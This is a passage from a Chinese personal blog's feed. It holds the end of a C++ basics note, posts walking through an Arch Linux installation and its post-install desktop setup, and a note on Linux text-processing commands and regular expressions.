&lt;&lt; std::endl;<br>2、使用using关键字。 using std::cout; using std::endl; using std::cin; 以上程序可以写成 cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; endl;<br>3、最方便的就是使用using namespace std **（一般不用）**; 例如： using namespace std;这样命名空间std内定义的所有标识符都有效（曝光）。就好像它们被声明为全局变量一样。那么以上语句可以如下写: cout &lt;&lt;hex &lt;&lt; 3.4 &lt;&lt; endl;**因为标准库非常的庞大，所以程序员在选择的类的名称或函数名时就很有可能和标准库中的某个名字相同。**所以为了避免这种情况所造成的名字冲突，就把标准库中的一切都被放在名字空间std中。但这又会带来了一个新问题。无数原有的C++代码都依赖于使用了多年的伪标准库中的功能，他们都是在全局空间下的。所以就有了&lt;iostream.h&gt;和<iostream>等等这样的头文件，一个是为了兼容以前的C++代码，一个是为了支持新的标准。命名空间std封装的是标准程序库的名称，标准程序库为了和以前的头文件区别，一般不加”.h”。</p><h4 id="有无命名空间的区别："><a href="#有无命名空间的区别：" class="headerlink" title="有无命名空间的区别："></a>有无命名空间的区别：</h4><p><img src="/images/Cplus0-0.png"></p><h2 id="0-3-编译C-程序"><a href="#0-3-编译C-程序" class="headerlink" title="0-3 编译C++程序"></a>0-3 编译C++程序</h2><h3 id="步骤如下："><a href="#步骤如下：" class="headerlink" title="步骤如下："></a>步骤如下：</h3><p><img src="/images/Cplus0-1.png"></p><h2 id="0-4-处理错误"><a href="#0-4-处理错误" class="headerlink" title="0-4 处理错误"></a>0-4 处理错误</h2><h3 id="4-1-错误分类"><a href="#4-1-错误分类" class="headerlink" title="4.1 错误分类"></a>4.1 错误分类</h3><ul><li>Syntax Error（语法错误）</li><li>Runtime Error（运行时错误）</li><li>Logic Error （逻辑错误）</li></ul><p>语法错误就是违反了编程语言的语句形式或者使用规则，一般由编译器检查指出；运行时错误是指程序运行时，遇到一个无法执行的操作，一般编译器无法检查指出；逻辑错误是指程序运行结果与预期的正确结果不一致，编译器无法检查指出。</p><h3 id="4-2-常见语法错误"><a href="#4-2-常见语法错误" class="headerlink" title="4.2 常见语法错误"></a>4.2 常见语法错误</h3><ul><li>写错关键字</li><li>遗漏分号</li><li>遗漏括号</li><li>遗漏引号</li><li>全半角中英文混写</li><li>命名空间引发的错误</li></ul><h2 id="0-5-输入和输出"><a href="#0-5-输入和输出" class="headerlink" title="0-5 输入和输出"></a>0-5 输入和输出</h2><h3 id="5-1-输入输出分类"><a href="#5-1-输入输出分类" class="headerlink" title="5.1 输入输出分类"></a>5.1 输入输出分类</h3><ul><li>标准IO</li><li>文件IO</li><li>字符串IO</li><li>网络IO</li></ul><h3 id="5-2-C-的输入和输出"><a href="#5-2-C-的输入和输出" class="headerlink" title="5.2 C++的输入和输出"></a>5.2 C++的输入和输出</h3><p>C++使用一种叫做“流”的概念对屏幕、键盘或者文件进行输入输出操作</p><p><img src="/images/Cplus0-2.png"></p><p><img src="/images/Cplus0-3.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ArchLinux安装后的一些配置</title>
    <link href="/blog/2020/02/05/ArchLinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/"/>
    <url>/blog/2020/02/05/ArchLinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><strong>前几天安装好了Arch Linux的基础包部分，现在试着配置一下我们安装好的系统</strong></p><p><img src="/images/fj29.jpg"></p><span id="more"></span><h2 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h2><p>在这之前所有操作都是以root用户的身份进行的，由于root的权限过高，日常使用root用户是不安全的。Linux为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。<br>执行以下命令来创建一个名为xin的用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m -G wheel xin<br></code></pre></td></tr></table></figure><p>在这里稍微解释一下各参数的含义：<br>-m：在创建时同时在&#x2F;home目录下创建一个与用户名同名的文件夹，这个目录就是你的家目录啦！家目录有一个别名是<del>，你可以在任何地方使用</del>来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点：<br>只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。<br>你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。<br>切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。<br>有些著名的配置文件比如vim的配置文件~&#x2F;.vimrc，只要根据自己的使用习惯配置一次， 在另一个Linux系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。<br>-G wheel：-G代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料学习。<br>当然记得为新用户设置一个密码，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd xin<br></code></pre></td></tr></table></figure><p>根据提示输入两次密码就可以了，这是用户的密码。</p><h2 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h2><p>我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么我们如果需要执行一些只有root用户才能执行的命令，有一个简单的办法就是使用<strong>sudo</strong>。</p><p>sudo本身也是一个软件包，我们可以通过pacman来安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S sudo<br></code></pre></td></tr></table></figure><p>接下来我们需要修改sudo的配置文件，教程上面说的是使用visudo，可是我不能用，于是我手动找到了sudo的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/sudoers<br></code></pre></td></tr></table></figure><p>编辑之后发现这是一个只读文件，于是退出重来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +w /etc/sudoers<br>vim /etc/sudoers<br><span class="hljs-built_in">chmod</span> -w /etc/sudoers<br></code></pre></td></tr></table></figure><p>编辑时找到# %wheel ALL&#x3D;(ALL)ALL这一行，将前面的#去掉即可</p><p>最后记得将配置文件恢复成只读，为了安全考虑。图如下：</p><p><img src="/images/archlinux3.png"></p><p>配置好sudo后，输入reboot命令重启，输入刚创建的用户名密码即可登录。</p><h2 id="图形界面的安装"><a href="#图形界面的安装" class="headerlink" title="图形界面的安装"></a>图形界面的安装</h2><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>如果是因特尔的集成显卡就可执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xf86-video-intel<br><br></code></pre></td></tr></table></figure><h3 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h3><p>Xorg是Linux下的一个著名的开源图形服务，我们的桌面环境需要Xorg的支持。<br>执行如下命令安装Xorg及相关组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xorg<br></code></pre></td></tr></table></figure><h3 id="安装桌面环境"><a href="#安装桌面环境" class="headerlink" title="安装桌面环境"></a>安装桌面环境</h3><p>Linux下有很多著名的桌面环境如Xfce、KDE(Plasma)、Gnome、Unity、Deepin等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。</p><h4 id="安装Xfce"><a href="#安装Xfce" class="headerlink" title="安装Xfce"></a>安装Xfce</h4><p>直接安装软件包组即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xfce4 xfce4-goodies<br></code></pre></td></tr></table></figure><h4 id="安装KDE（Plasma）"><a href="#安装KDE（Plasma）" class="headerlink" title="安装KDE（Plasma）"></a>安装KDE（Plasma）</h4><p>直接安装软件包组合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S plasma kde-applications <br></code></pre></td></tr></table></figure><h3 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h3><p>安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用sddm。</p><h4 id="安装sddm"><a href="#安装sddm" class="headerlink" title="安装sddm"></a>安装sddm</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S sddm<br></code></pre></td></tr></table></figure><h4 id="设置开机启动sddm服务"><a href="#设置开机启动sddm服务" class="headerlink" title="设置开机启动sddm服务"></a>设置开机启动sddm服务</h4><p>这里就要介绍一下Arch下用于管理系统服务的命令systemctl了，服务的作用就是字面意思，为我们提供特定的服务，比如sddm就为我们提供了启动xorg与管理桌面环境的服务。<br>命令的使用并不复杂：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start   服务名 （启动一项服务）<br>sudo systemctl stop    服务名 （停止一项服务）<br>sudo systemctl <span class="hljs-built_in">enable</span>  服务名 （开机启动一项服务）<br>sudo systemctl <span class="hljs-built_in">disable</span> 服务名 （取消开机启动一项服务）<br></code></pre></td></tr></table></figure><p>执行以下命令设置开机启动sddm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> sddm<br></code></pre></td></tr></table></figure><h3 id="提前配置网络"><a href="#提前配置网络" class="headerlink" title="提前配置网络"></a>提前配置网络</h3><p>到现在我们已经安装好了桌面环境，但是还有一件事情需要我们提前设置一下。由于我们之前使用的一直都是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以我们需要禁用netctl并启用NetworkManager：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">disable</span> netctl<br>sudo systemctl <span class="hljs-built_in">enable</span> NetworkManager （注意大小写）<br></code></pre></td></tr></table></figure><p>同时我们可以安装一个工具栏网络显示图标：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S network-manager-applet<br></code></pre></td></tr></table></figure><p>重新启动之后就看到我们安装的桌面啦：</p><p><img src="/images/archlinux4.png"></p><h2 id="安装vmtools（虚拟机工具）"><a href="#安装vmtools（虚拟机工具）" class="headerlink" title="安装vmtools（虚拟机工具）"></a>安装vmtools（虚拟机工具）</h2><p>安装vmtools的时候发现按照以往的安装方法并不适用，一直提示找不到rc0.d到rc6.d，查阅资料后发现这些文件为各启动级别的启动脚本，ArchLinux并不是以此方式启动的，因此不能使用vmware自带的安装包安装，经过查阅资料我们可以安装一个开源的工具包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S open-vm-tools<br></code></pre></td></tr></table></figure><p>后面出了点问题，找不到vmtoolsd这个服务，还没解决。解决以后再写，</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ArchLinux初体验</title>
    <link href="/blog/2020/02/02/ArchLinux%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/blog/2020/02/02/ArchLinux%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p><strong>有时间玩一些好玩的了，听说亲手弄一个Arch Linux是一个很有成就感的事情，说干就干，记录一下配置的过程吧。</strong></p><p><img src="/images/fj26.jpg"></p><span id="more"></span><h2 id="ArchLinux安装"><a href="#ArchLinux安装" class="headerlink" title="ArchLinux安装"></a>ArchLinux安装</h2><h3 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h3><p><strong>查看目前的分区情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="/images/archlinux1.png"></p><p>可以看到我的一块20GB的磁盘空间，并且没有进行任何分区（虚拟机分配的）</p><p><strong>创建一个根分区：</strong></p><p>输入命令：<strong>fdisk &#x2F;dev&#x2F;sda</strong></p><ol><li>如果是一块全新硬盘，而且是BIOS&#x2F;MBR引导方式，输入o来创建一个新的MBR分区表</li><li>输入n创建一个新的分区，适当选择相应的分区选项</li><li>输入p查看新建的分区</li><li>输入w来讲之前所有的操作写入磁盘生效</li><li>输入以下命令格式化更创建的根分区：mkfs.ext4 &#x2F;dev&#x2F;sda1</li></ol><p><strong>挂载分区：</strong> mount  &#x2F;dev&#x2F;sda1 &#x2F;mnt</p><h3 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h3><p>现在我们是在新安装的系统上进行操作，所以我们要重新联网，我们在安装系统时已经提前装好了相关的包，所以我们需要测试一下是否正常连接网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com<br></code></pre></td></tr></table></figure><p>如果你使用的有线网络并且路由器支持DHCP，那么插上网线就可正常使用网络。</p><h3 id="安装基本包"><a href="#安装基本包" class="headerlink" title="安装基本包"></a>安装基本包</h3><p><strong>选择镜像源</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>将清华和浙大的源放进最开始的地方（优先级高）</p><p>Server &#x3D; <a href="http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch">http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</a><br>Server &#x3D; <a href="http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch">http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch</a></p><p><strong>安装基本包</strong></p><p>pacstrap &#x2F;mnt base base-devel linux linux-firmware dhcpcd</p><p><strong>配置Fstab</strong></p><p>生成自动挂载分区的fstab文件，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p>由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p><strong>Chroot</strong></p><p>Chroot意为Change root，相当于把操纵权交给我们新安装（或已经存在）的Linux系统，执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行。</p><p>执行如下命令：</p><p><strong>arch-chroot &#x2F;mnt</strong></p><h2 id="ArchLinux安装后一些必要的配置"><a href="#ArchLinux安装后一些必要的配置" class="headerlink" title="ArchLinux安装后一些必要的配置"></a>ArchLinux安装后一些必要的配置</h2><h3 id="创建交换文件"><a href="#创建交换文件" class="headerlink" title="创建交换文件"></a>创建交换文件</h3><p>交换文件可以在物理内存不足的时候将部分内存暂存到交换文件中，避免系统由于内存不足而完全停止工作。<br>之前我们通常采用单独一个分区的方式作为交换分区，现在更推荐采用交换文件的方式，更便于我们的管理。<br>分配一块空间用于交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fallocate -l 768M /swapfile<br></code></pre></td></tr></table></figure><p>更改权限，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 /swapfile<br></code></pre></td></tr></table></figure><p>设置交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /swapfile<br></code></pre></td></tr></table></figure><p>启用交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon /swapfile<br></code></pre></td></tr></table></figure><p>最后我们需要编辑&#x2F;etc&#x2F;fstab为交换文件设置一个入口，使用vim打开文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/fstab<br></code></pre></td></tr></table></figure><p>在最后一行添加以下内容：</p><p><strong>&#x2F;swapfile none swap defaults 0 0</strong></p><h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p>依次执行如下命令设置我们的时区为上海并生成相关文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>hwclock --systohc<br></code></pre></td></tr></table></figure><h3 id="设置Locale"><a href="#设置Locale" class="headerlink" title="设置Locale"></a>设置Locale</h3><p>设置我们使用的语言选项，执行如下命令来编辑&#x2F;etc&#x2F;locale.gen文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/locale.gen<br></code></pre></td></tr></table></figure><p>在文件中找到zh_CN.UTF-8 UTF-8 zh_HK.UTF-8 UTF-8 zh_TW.UTF-8 UTF-8 en_US.UTF-8 UTF-8这四行，去掉行首的#号，保存并退出。</p><p>然后执行： locale-gen</p><p>打开（不存在时会创建）&#x2F;etc&#x2F;locale.conf文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/locale.conf<br></code></pre></td></tr></table></figure><p>在文件的第一行加入以下内容：</p><p>LANG&#x3D;en_US.UTF-8</p><p>保存并退出。</p><h3 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h3><p>打开（不存在时会创建）&#x2F;etc&#x2F;hostname文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hostname<br></code></pre></td></tr></table></figure><p>在文件的第一行输入你自己设定的一个myhostname，我设置的时xin，保存并退出。</p><p>编辑&#x2F;etc&#x2F;hosts文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>在文件末添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1localhost<br>::1    localhost<br>127.0.1.1xin.localdomainxin<br></code></pre></td></tr></table></figure><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>Root是Linux中具有最高权限帐户，有些敏感的操作必须通过Root用户进行，比如使用pacman，我们之前进行所有的操作也都是以Root用户进行的，也正是因为Root的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为Root帐户设置一个密码：</p><p>执行以下命令：</p><p><strong>passwd</strong></p><p>按照提示操作。</p><h3 id="安装Intel-ucode（非IntelCPU可以跳过此步骤）"><a href="#安装Intel-ucode（非IntelCPU可以跳过此步骤）" class="headerlink" title="安装Intel-ucode（非IntelCPU可以跳过此步骤）"></a>安装Intel-ucode（非IntelCPU可以跳过此步骤）</h3><p>执行命令：<strong>pacman -S intel-ucode</strong></p><h3 id="安装Bootloader"><a href="#安装Bootloader" class="headerlink" title="安装Bootloader"></a>安装Bootloader</h3><ul><li><p>首先安装os-prober和ntfs-3g这两个包，它可以配合Grub检测已经存在的系统，自动设置启动选项。命令如下：pacman -S os-prober ntfs-3g</p></li><li><ul><li>安装grub包：</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S grub</span><br></code></pre></td></tr></table></figure><ul><li>部署grub：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-install --target=i386-pc /dev/sda （将sdx换成你安装的硬盘）<br></code></pre></td></tr></table></figure><p>注意这里的sdx应该为硬盘（例如<code>/dev/sda</code>），<strong>而不是</strong>形如<code>/dev/sda1</code>这样的分区。</p><ul><li>生成配置文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure></li></ul><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p>exit退出后，umount &#x2F;mnt 后reboot即可进入新的操作系统。</p><p><img src="/images/archlinux2.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux开发与应用</title>
    <link href="/blog/2020/01/19/Linux%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    <url>/blog/2020/01/19/Linux%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>趁着假期没有事情做，具体的学习一下Linux在实际使用时的常用技巧。</strong></p><p><img src="/images/fj28.jpg"></p><span id="more"></span><h2 id="系统状态查看工具"><a href="#系统状态查看工具" class="headerlink" title="系统状态查看工具"></a>系统状态查看工具</h2><h3 id="文本文件的处理"><a href="#文本文件的处理" class="headerlink" title="文本文件的处理"></a>文本文件的处理</h3><h4 id="1-重定向与管道"><a href="#1-重定向与管道" class="headerlink" title="1.重定向与管道"></a>1.重定向与管道</h4><p>重定向机制：</p><ul><li><p>输出重定向，将ls的输出放到文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l &gt; filelist.txt<br></code></pre></td></tr></table></figure></li><li><p>输入重定向，将文件中的内容放到命令行中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> &lt; filelist.txt<br></code></pre></td></tr></table></figure></li></ul><p>管道机制，可以组合命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l | <span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><h4 id="2-文本文件处理命令的特点"><a href="#2-文本文件处理命令的特点" class="headerlink" title="2.文本文件处理命令的特点"></a>2.文本文件处理命令的特点</h4><ul><li>不指定处理对象文件名时，从标准输入获得数据</li><li>指定处理对象文件名时，从文件中获取数据</li><li>多数命令可以指定多个文件</li><li>处理结果在标准输出显示</li></ul><h4 id="3-文本文件读取与处理的命令"><a href="#3-文本文件读取与处理的命令" class="headerlink" title="3.文本文件读取与处理的命令"></a>3.文本文件读取与处理的命令</h4><ul><li>more&#x2F;less：逐屏显示文件</li><li>cat与od：列出文件内容</li><li>head与tail：显示文件头部或者尾部</li><li>tee：tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件</li><li>wc：字计数</li><li>sort：对文件内容排序</li><li>tr：翻译字符</li><li>uniq：筛选文件中的重复行</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="概念和相关命令"><a href="#概念和相关命令" class="headerlink" title="概念和相关命令"></a>概念和相关命令</h3><h4 id="1-正则表达式概念"><a href="#1-正则表达式概念" class="headerlink" title="1.正则表达式概念"></a>1.正则表达式概念</h4><p>是字符串匹配操作和替换操作。</p><h4 id="2-正则表达式的特殊字符"><a href="#2-正则表达式的特殊字符" class="headerlink" title="2.正则表达式的特殊字符"></a>2.正则表达式的特殊字符</h4><ul><li>六个元字符：. * [ \ ^ $</li><li>其他字符与其自身匹配</li><li>转义：用反斜线可以取消特殊字符的特殊含义</li></ul><h4 id="3-定义集合"><a href="#3-定义集合" class="headerlink" title="3.定义集合"></a>3.定义集合</h4><ul><li>在一对方括号之间的字符为集合的内容</li><li>圆点，星号，反斜线在方括号内时代表他们自己</li><li>可以用 - 定义一个区间，如[a-z]</li><li>[][] [][]集合含左右中括号两个字符</li><li>减号在最后，则失去表示区间的意义</li></ul><h4 id="4-单字符正则表达式的组合"><a href="#4-单字符正则表达式的组合" class="headerlink" title="4.单字符正则表达式的组合"></a>4.单字符正则表达式的组合</h4><p>锚点：$与^</p><ul><li>$在尾部时有特殊意义，否则与自身匹配，例如123$匹配文件行末尾的123匹配，$123与字符串$123匹配</li><li>^在首部时有特殊意义，否则与自身匹配。</li></ul><h4 id="5-对基本正则表达式进行了改进"><a href="#5-对基本正则表达式进行了改进" class="headerlink" title="5.对基本正则表达式进行了改进"></a>5.对基本正则表达式进行了改进</h4><ul><li>表示分组：()圆括号，(xy)*可匹配空字符串，xy，xyxy，xyxyxy</li><li>表示逻辑运算：表示逻辑或的符号|    (pink|green)表示与pink或者green匹配</li><li>重复次数的定义：与星号地位类似的+和?，*表示它左边的单字符正则表达式的0次或多次重复，+号表示1次或多次，?表示0次或者一次</li></ul><h3 id="正则表达式的应用"><a href="#正则表达式的应用" class="headerlink" title="正则表达式的应用"></a>正则表达式的应用</h3><h4 id="1-三个与正则表达式的相关处理命令"><a href="#1-三个与正则表达式的相关处理命令" class="headerlink" title="1.三个与正则表达式的相关处理命令"></a>1.三个与正则表达式的相关处理命令</h4><ul><li>grep&#x2F;egrep&#x2F;fgrep:在文件中查找字符串</li><li>sed：流编辑</li><li>awk:逐行扫描进行文本处理的一门语言</li></ul><p><strong>grep：</strong></p><ul><li>语法：grep  模式  文件名列表</li><li>fgrep快速搜索指定字符串，不是按模式而是按字符串</li><li>egrep使用扩展正则表达式描述模式</li><li>-F –fixed-strings     -G –basic-regular expression   -E –extended-regexp    -P –perl-regexp(PCRE)</li><li>查PCRE语法：man pcresyntax</li><li>-n 显示每行的行号    -v显示不包含模式的行   -i 字母比较时忽略字母的大小写</li></ul><p><strong>sed：</strong></p><ul><li>用法：sed  ‘命令’ 文件名列表</li><li>Linux sed 命令是利用脚本来处理文本文件。sed 可依照脚本的指令来处理、编辑文本文件。Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等</li></ul><h2 id="linux命令大全"><a href="#linux命令大全" class="headerlink" title="linux命令大全"></a>linux命令大全</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">arch</span> 显示机器的处理器架构<br><span class="hljs-built_in">uname</span> -m 显示机器的处理器架构<br><span class="hljs-built_in">uname</span> -r 显示正在使用的内核版本 <br>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) <br>hdparm -i /dev/hda 罗列一个磁盘的架构特性 <br>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 <br><span class="hljs-built_in">cat</span> /proc/cpuinfo 显示CPU info的信息 <br><span class="hljs-built_in">cat</span> /proc/interrupts 显示中断 <br><span class="hljs-built_in">cat</span> /proc/meminfo 校验内存使用 <br><span class="hljs-built_in">cat</span> /proc/swaps 显示哪些swap被使用 <br><span class="hljs-built_in">cat</span> /proc/version 显示内核的版本 <br><span class="hljs-built_in">cat</span> /proc/net/dev 显示网络适配器及统计 <br><span class="hljs-built_in">cat</span> /proc/mounts 显示已加载的文件系统 <br>lspci -tv 罗列 PCI 设备 <br>lsusb -tv 显示 USB 设备 <br><span class="hljs-built_in">date</span> 显示系统日期 <br>cal 2007 显示2007年的日历表 <br><span class="hljs-built_in">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒 <br>clock -w 将时间修改保存到 BIOS <br><br><br></code></pre></td></tr></table></figure><h3 